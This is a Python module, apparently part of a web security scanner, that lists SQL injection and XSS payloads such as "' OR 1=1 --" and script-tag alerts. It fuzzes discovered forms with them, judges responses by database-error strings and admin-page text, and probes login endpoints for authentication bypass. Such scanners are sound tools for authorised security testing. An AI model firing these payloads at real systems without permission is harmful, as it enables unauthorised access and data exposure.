"""Attack payloads, response judging, and active form fuzzing."""

from __future__ import annotations

from urllib.parse import urljoin

from basilisk.http import RequestEngine


class AttackEngine:
    """Payload libraries for SQLi and XSS checks."""

    def get_sqli_payloads(self) -> list[str]:
        return [
            "1' OR '1'='1",
            "admin' --",
            "' OR 1=1 --",
            "admin' or '1'='1",
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
        ]

    def get_xss_payloads(self) -> list[str]:
        return [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "<img src=x onerror=alert(1)>",
        ]


class JudgeEngine:
    """Heuristic checks for successful SQLi / auth bypass responses."""

    DB_ERRORS = [
        "sql syntax",
        "mysql_fetch",
        "native client",
        "unclosed quotation mark",
        "sqlite3.operationalerror",
        "postgresql query failed",
        "ora-00933",
        "unhandled exception",
        "internal server error",
    ]

    AUTH_INDICATORS = [
        "welcome admin",
        "admin dashboard",
    ]

    def evaluate_login(self, response) -> bool:
        if response.status_code == 500:
            return True
        body = response.text.lower()
        for indicator in self.DB_ERRORS + self.AUTH_INDICATORS:
            if indicator in body:
                return True
        return False

    def find_db_error(self, body: str) -> str | None:
        lower = body.lower()
        for error in self.DB_ERRORS:
            if error in lower:
                return error
        return None


class ActiveFuzzer:
    """Inject payloads into discovered forms and score responses."""

    TEXT_TYPES = {"text", "search", "textarea", "email", "password", "url"}

    def __init__(self, requester: RequestEngine | None = None):
        self.requester = requester or RequestEngine(timeout=4)
        self.attacker = AttackEngine()
        self.judge = JudgeEngine()

    def fuzz_form(self, form_details: dict) -> list[dict]:
        findings: list[dict] = []
        action_url = form_details["action_url"]
        method = form_details["method"].upper()
        inputs = form_details["inputs"]
        if not inputs:
            return findings

        for payload in self.attacker.get_sqli_payloads():
            test_data = self._build_payload(inputs, payload)
            response = self._submit(method, action_url, test_data)
            if not response:
                continue
            error = self.judge.find_db_error(response["body"])
            if error:
                findings.append(
                    {
                        "vulnerability": "Potential SQL Injection (SQLi)",
                        "severity": "High",
                        "description": f"Signature '{error}' for payload: {payload}",
                        "target": action_url,
                    }
                )
                break

        for payload in self.attacker.get_xss_payloads():
            test_data = self._build_payload(inputs, payload)
            response = self._submit(method, action_url, test_data)
            if response and payload in response["body"]:
                findings.append(
                    {
                        "vulnerability": "Potential Reflected XSS",
                        "severity": "High",
                        "description": f"Payload reflected raw: {payload}",
                        "target": action_url,
                    }
                )

        return findings

    def _build_payload(self, inputs: list[dict], payload: str) -> dict:
        data = {}
        for inp in inputs:
            if inp["type"] in self.TEXT_TYPES:
                data[inp["name"]] = payload
            else:
                data[inp["name"]] = inp["default_value"]
        return data

    def _submit(self, method: str, url: str, data: dict) -> dict | None:
        if method == "POST":
            return self.requester.send("POST", url, data=data)
        return self.requester.send("GET", url, params=data)


def scan_login_endpoint(
    target_url: str,
    login_endpoint: str = "/login",
    requester: RequestEngine | None = None,
) -> dict:
    """Focused SQLi probe against a login form endpoint."""
    engine = requester or RequestEngine(timeout=5)
    attacker = AttackEngine()
    judge = JudgeEngine()
    full_url = urljoin(target_url.rstrip("/") + "/", login_endpoint.lstrip("/"))

    results = {"target": full_url, "vulnerable": False, "exploits_found": [], "findings": []}

    for payload in attacker.get_sqli_payloads()[:4]:
        data = {"username": payload, "password": "wrong_password"}
        response = engine.send("POST", full_url, data=data)
        if not response:
            break
        raw = response.get("raw")
        if raw and judge.evaluate_login(raw):
            results["vulnerable"] = True
            exploit = {
                "payload": payload,
                "status_code": response["status_code"],
                "reason": "Auth bypass or database leak/crash indicators",
            }
            results["exploits_found"].append(exploit)
            results["findings"].append(
                {
                    "vulnerability": "Potential SQL Injection (Login)",
                    "severity": "High",
                    "description": f"{exploit['reason']} — payload: {payload}",
                    "target": full_url,
                }
            )

    return results
